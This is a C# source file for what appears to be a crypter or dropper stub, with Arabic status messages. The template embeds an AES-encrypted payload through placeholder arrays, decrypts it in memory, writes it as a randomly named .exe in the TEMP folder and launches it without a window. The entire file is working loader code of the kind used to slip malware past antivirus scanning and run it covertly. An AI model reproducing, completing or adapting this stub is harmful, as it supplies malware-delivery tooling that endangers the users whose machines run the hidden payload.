using System;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Windows.Forms;

class Program
{
    static byte[] encryptedData = new byte[] { __ENCRYPTED_DATA__ };
    static byte[] key = new byte[] { __AES_KEY__ };
    static byte[] iv = new byte[] { __AES_IV__ };

    static void Main()
    {
        try
        {
            MessageBox.Show("1. بدأ فك التشفير...");

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                
                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msOutput = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msOutput);
                            byte[] decryptedBytes = msOutput.ToArray();
                            
                            MessageBox.Show("2. تم فك التشفير. حجم البايلود: " + decryptedBytes.Length + " بايت");

                            // كتابة البايلود في مجلد TEMP باسم عشوائي
                            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                            File.WriteAllBytes(tempPath, decryptedBytes);

                            MessageBox.Show("3. تم كتابة البايلود في: " + tempPath);

                            // تشغيل البايلود
                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = tempPath;
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            
                            Process.Start(psi);
                            
                            MessageBox.Show("4. تم تشغيل البايلود بنجاح.");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("خطأ: " + ex.Message);
        }
    }
}